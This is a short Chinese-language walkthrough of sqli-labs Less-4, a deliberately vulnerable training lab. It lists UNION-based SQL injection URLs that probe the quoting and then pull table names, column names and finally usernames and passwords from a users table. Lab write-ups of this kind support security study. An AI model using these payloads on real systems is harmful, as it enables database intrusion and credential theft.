---
title: Less - 04
date: 2023-03-13T13:05:58Z
lastmod: 2023-03-13T13:39:48Z
---

# Less - 04

---

# 通关教程

---

## 1、判断注入

---

```http
http://192.168.225.132/sqli-labs/Less-4/?id=1 #回显正常
http://192.168.225.132/sqli-labs/Less-4/?id=1' #回显正常
http://192.168.225.132/sqli-labs/Less-4/?id=1" #回显错误
http://192.168.225.132/sqli-labs/Less-4/?id=1")--+ #回显正常
```

​![image](assets/image-20230313130732-p0df075.png)​

​![image](assets/image-20230313130752-3iq7mk3.png)​

---

## 2、查看当前的数据库

---

```http
http://192.168.225.132/sqli-labs/Less-4/?id=1") union select 1,2,database()--+
```

​![image](assets/image-20230313130922-egg16cq.png)​

---

## 3、查看当前数据表

---

```http
http://192.168.225.132/sqli-labs/Less-4/?id=0")  union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security')--+
```

​![image](assets/image-20230313131013-hsg8brn.png)​

---

## 4、查看字段名

---

```http
http://192.168.225.132/sqli-labs/Less-4/?id=0") union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users')--+
```

​![image](assets/image-20230313131117-dnfcvzv.png)​

---

## 5、查看字段值

---

```http
http://192.168.225.132/sqli-labs/Less-4/?id=0") union select 1,2,(select group_concat(username,password) from security.users)--+
```

​![image](assets/image-20230313131650-a7tz1sv.png)​

‍
